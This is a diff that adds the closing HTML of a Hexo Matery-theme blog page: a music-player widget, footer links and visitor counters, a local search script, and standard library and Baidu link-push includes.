+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">John Doe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">170.2k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/playZG" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:playzg@aliyun.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1351802079" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1351802079" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
